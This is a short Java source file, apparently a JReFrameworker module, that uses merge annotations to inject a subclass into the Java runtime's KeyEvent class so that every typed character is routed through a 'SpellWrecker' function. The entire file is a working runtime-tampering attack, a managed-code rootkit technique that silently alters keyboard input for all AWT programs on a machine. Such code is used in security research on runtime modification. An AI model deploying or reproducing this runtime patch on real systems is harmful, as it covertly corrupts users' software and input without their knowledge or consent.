package java.awt.event;

import java.awt.Frame;
import java.awt.event.KeyEvent;

import jreframeworker.annotations.methods.MergeMethod;
import jreframeworker.annotations.types.MergeType;

@MergeType
public class SpellWreckedKeyEvent extends KeyEvent {

	private static final long serialVersionUID = 1L;

	public SpellWreckedKeyEvent(Frame frame, int i, long currentTimeMillis, int j, int vkUndefined, char c) {
		super(frame, i, currentTimeMillis, j, vkUndefined, c);
	}

	@MergeMethod
	@Override
	public char getKeyChar(){
		char original = super.getKeyChar();
		return SpellWrecker.spellwreck(original);
	}

}
